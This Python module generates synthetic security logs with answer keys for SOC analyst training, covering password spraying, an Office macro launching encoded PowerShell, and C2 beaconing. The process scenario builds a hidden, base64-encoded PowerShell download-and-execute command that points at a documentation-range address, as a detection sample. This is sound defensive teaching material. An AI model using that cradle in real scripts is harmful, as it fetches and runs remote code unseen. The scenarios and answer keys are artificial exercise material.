"""Synthetic, labelled security logs for the soc-foundations pack.

Every dataset is generated from (scenario, seed), so the same seed always gives
the same rows and a new seed gives a fresh variant with different hosts, users,
addresses and timings. Ground truth (which rows and which entities are
malicious) is returned separately and never written into the learner's tables.

All data is synthetic and defensive: it describes what an attack looks like in
logs, not how to carry one out. Addresses come from private ranges and the
documentation range 203.0.113.0/24 (RFC 5737).
"""

import base64
import random
from datetime import datetime, timedelta

BASE = datetime(2026, 11, 20, 8, 0, 0)

FIRST = ["anna", "ben", "carla", "dev", "elif", "farid", "greta", "hugo", "ines", "jonas",
         "kim", "lena", "mads", "nora", "omar", "pia", "rasmus", "sara", "tariq", "ulla",
         "vera", "wim", "xin", "yusuf", "zoe", "alma", "bo", "cleo", "dina", "emil"]
LAST = ["berg", "holm", "lund", "dahl", "kraft", "moe", "nyberg", "storm", "vik", "wald"]

AUTH_COLS = ["id", "ts", "Computer", "EventID", "TargetUserName", "IpAddress", "LogonType", "Status"]
PROC_COLS = ["id", "ts", "Computer", "User", "Image", "CommandLine", "ParentImage"]
CONN_COLS = ["id", "ts", "src_ip", "dst_ip", "dst_port", "proto", "bytes_out", "bytes_in", "duration"]


def _ts(t):
    return t.strftime("%Y-%m-%dT%H:%M:%S")


def _users(rng, n):
    names = set()
    while len(names) < n:
        names.add(f"{rng.choice(FIRST)}.{rng.choice(LAST)}")
    return sorted(names)


class _Table:
    def __init__(self, cols):
        self.cols = cols
        self.rows = []
        self.bad = set()

    def add(self, row, malicious=False):
        self.rows.append(row)
        if malicious:
            self.bad.add(row["id"])

    def finish(self):
        self.rows.sort(key=lambda r: (r["ts"], r["id"]))
        # Renumber in time order so ids give nothing away.
        mapping = {}
        for i, r in enumerate(self.rows, start=1):
            mapping[r["id"]] = i
            r["id"] = i
        self.bad = {mapping[b] for b in self.bad}
        return {"columns": self.cols, "rows": [[r[c] for c in self.cols] for r in self.rows]}


def spray(seed):
    """Password spray: one source tries one password against many accounts."""
    rng = random.Random(f"spray:{seed}")
    users = _users(rng, 30)
    dc = f"DC{rng.randint(1, 3):02d}"
    t = _Table(AUTH_COLS)
    nid = iter(range(1, 10_000))
    home = {u: f"10.0.1.{i + 10}" for i, u in enumerate(users)}

    for u in users:  # an ordinary day of interactive and network logons
        for _ in range(rng.randint(2, 5)):
            when = BASE + timedelta(minutes=rng.randint(0, 600))
            t.add({"id": next(nid), "ts": _ts(when), "Computer": dc, "EventID": 4624,
                   "TargetUserName": u, "IpAddress": home[u], "LogonType": rng.choice([2, 3, 10]),
                   "Status": "0x0"})
    for u in rng.sample(users, 5):  # typos: a failure or two, then success
        when = BASE + timedelta(minutes=rng.randint(0, 600))
        for k in range(rng.randint(1, 2)):
            t.add({"id": next(nid), "ts": _ts(when + timedelta(seconds=10 * k)), "Computer": dc,
                   "EventID": 4625, "TargetUserName": u, "IpAddress": home[u], "LogonType": 2,
                   "Status": "0xC000006A"})
        t.add({"id": next(nid), "ts": _ts(when + timedelta(seconds=40)), "Computer": dc, "EventID": 4624,
               "TargetUserName": u, "IpAddress": home[u], "LogonType": 2, "Status": "0x0"})
    # A misconfigured service: many failures, but one account (brute force shape, benign).
    svc, svc_ip = "svc_backup", f"10.0.2.{rng.randint(20, 60)}"
    start = BASE + timedelta(minutes=rng.randint(30, 300))
    for k in range(rng.randint(8, 14)):
        t.add({"id": next(nid), "ts": _ts(start + timedelta(minutes=5 * k)), "Computer": dc,
               "EventID": 4625, "TargetUserName": svc, "IpAddress": svc_ip, "LogonType": 3,
               "Status": "0xC000006A"})

    attacker = f"10.0.9.{rng.randint(100, 220)}"
    victims = rng.sample(users, rng.randint(18, 26))
    start = BASE + timedelta(minutes=rng.randint(120, 480))
    compromised = rng.choice(victims)  # the one account whose password matched
    for k, u in enumerate(victims):
        ok = u == compromised
        t.add({"id": next(nid), "ts": _ts(start + timedelta(seconds=8 * k + rng.randint(0, 3))),
               "Computer": dc, "EventID": 4624 if ok else 4625, "TargetUserName": u,
               "IpAddress": attacker, "LogonType": 3, "Status": "0x0" if ok else "0xC000006A"},
              malicious=True)

    table = t.finish()
    return {
        "tables": {"auth": table},
        "malicious_rows": {"auth": sorted(t.bad)},
        "entities": {"malicious": [attacker],
                     "benign": sorted({home[u] for u in users} | {svc_ip})},
        "answers": {"attacker_ip": attacker, "compromised_user": compromised,
                    "targeted_accounts": str(len(victims))},
    }


def _enc(cmd):
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


def process(seed):
    """Process creation: an Office document launching hidden, encoded PowerShell."""
    rng = random.Random(f"process:{seed}")
    users = _users(rng, 12)
    hosts = {u: f"WS-{i + 1:02d}" for i, u in enumerate(users)}
    t = _Table(PROC_COLS)
    nid = iter(range(1, 10_000))
    sysw = "C:\\Windows\\System32\\"
    ps = sysw + "WindowsPowerShell\\v1.0\\powershell.exe"
    office = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"
    benign = [
        ("C:\\Windows\\explorer.exe", "C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\userinit.exe"),
        ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
         "\"chrome.exe\" --profile-directory=Default", "C:\\Windows\\explorer.exe"),
        (office + "WINWORD.EXE", "\"WINWORD.EXE\" /n \"Q4 report.docx\"", "C:\\Windows\\explorer.exe"),
        (office + "EXCEL.EXE", "\"EXCEL.EXE\" budget.xlsx", "C:\\Windows\\explorer.exe"),
        (sysw + "notepad.exe", "notepad.exe notes.txt", "C:\\Windows\\explorer.exe"),
        (ps, "powershell.exe -NoProfile", "C:\\Windows\\explorer.exe"),
        (sysw + "svchost.exe", "svchost.exe -k netsvcs -p", sysw + "services.exe"),
    ]
    for u in users:
        for _ in range(rng.randint(6, 10)):
            img, cmd, parent = rng.choice(benign)
            when = BASE + timedelta(minutes=rng.randint(0, 600))
            t.add({"id": next(nid), "ts": _ts(when), "Computer": hosts[u], "User": f"CORP\\{u}",
                   "Image": img, "CommandLine": cmd, "ParentImage": parent})
    # Legitimate admin automation: PowerShell, a policy bypass, but a signed script by file.
    for _ in range(rng.randint(2, 4)):
        when = BASE + timedelta(minutes=rng.randint(0, 600))
        t.add({"id": next(nid), "ts": _ts(when), "Computer": "SRV-FILE01", "User": "CORP\\svc_backup",
               "Image": ps, "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1",
               "ParentImage": sysw + "svchost.exe"})

    victim = rng.choice(users)
    payload = _enc(f"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.{rng.randint(10, 99)}/a')")
    flag = rng.choice(["-enc", "-EncodedCommand", "-e"])
    when = BASE + timedelta(minutes=rng.randint(60, 540))
    t.add({"id": next(nid), "ts": _ts(when), "Computer": hosts[victim], "User": f"CORP\\{victim}",
           "Image": office + "WINWORD.EXE", "CommandLine": "\"WINWORD.EXE\" /n \"invoice_8841.docm\"",
           "ParentImage": office + "OUTLOOK.EXE"})
    t.add({"id": next(nid), "ts": _ts(when + timedelta(seconds=4)), "Computer": hosts[victim],
           "User": f"CORP\\{victim}", "Image": ps,
           "CommandLine": f"powershell.exe -nop -w hidden {flag} {payload}",
           "ParentImage": office + "WINWORD.EXE"}, malicious=True)

    table = t.finish()
    return {
        "tables": {"process": table},
        "malicious_rows": {"process": sorted(t.bad)},
        "entities": {"malicious": [hosts[victim]], "benign": sorted(set(hosts.values()) - {hosts[victim]})},
        "answers": {"victim_host": hosts[victim], "victim_user": f"CORP\\{victim}",
                    "parent_image": "WINWORD.EXE"},
    }


def beacon(seed):
    """Command-and-control beaconing: small, regular connections to one address."""
    rng = random.Random(f"beacon:{seed}")
    hosts = [f"10.0.3.{i}" for i in rng.sample(range(10, 90), 15)]
    t = _Table(CONN_COLS)
    nid = iter(range(1, 50_000))
    web = [f"198.51.100.{i}" for i in range(1, 40)]  # RFC 5737 documentation range
    for h in hosts:  # browsing: bursty and irregular
        for _ in range(rng.randint(25, 45)):
            when = BASE + timedelta(seconds=rng.randint(0, 6 * 3600))
            t.add({"id": next(nid), "ts": _ts(when), "src_ip": h, "dst_ip": rng.choice(web),
                   "dst_port": rng.choice([443, 443, 443, 80]), "proto": "tcp",
                   "bytes_out": rng.randint(400, 6000), "bytes_in": rng.randint(2000, 900_000),
                   "duration": round(rng.uniform(0.1, 30.0), 2)})
    # Benign but regular: the update agent on one host checks in every hour.
    updater = rng.choice(hosts)
    for k in range(6):
        t.add({"id": next(nid), "ts": _ts(BASE + timedelta(hours=k, seconds=rng.randint(0, 2))),
               "src_ip": updater, "dst_ip": "198.51.100.200", "dst_port": 443, "proto": "tcp",
               "bytes_out": 900, "bytes_in": 1500, "duration": 0.4})
    victim = rng.choice([h for h in hosts if h != updater])
    c2 = f"203.0.113.{rng.randint(10, 250)}"
    period = rng.choice([30, 45, 60, 90])
    start = BASE + timedelta(seconds=rng.randint(0, 3600))
    for k in range(int(4 * 3600 / period)):
        when = start + timedelta(seconds=k * period + rng.randint(0, 2))
        t.add({"id": next(nid), "ts": _ts(when), "src_ip": victim, "dst_ip": c2, "dst_port": 443,
               "proto": "tcp", "bytes_out": rng.randint(180, 260), "bytes_in": rng.randint(90, 160),
               "duration": round(rng.uniform(0.05, 0.3), 2)}, malicious=True)

    table = t.finish()
    return {
        "tables": {"conn": table},
        "malicious_rows": {"conn": sorted(t.bad)},
        "entities": {"malicious": [victim], "benign": sorted(set(hosts) - {victim})},
        "answers": {"beaconing_host": victim, "c2_ip": c2, "period_seconds": str(period)},
    }


SCENARIOS = {"spray": spray, "process": process, "beacon": beacon}


def generate(scenario, seed):
    if scenario not in SCENARIOS:
        raise KeyError(f"unknown scenario {scenario!r}; known: {', '.join(sorted(SCENARIOS))}")
    return SCENARIOS[scenario](seed)
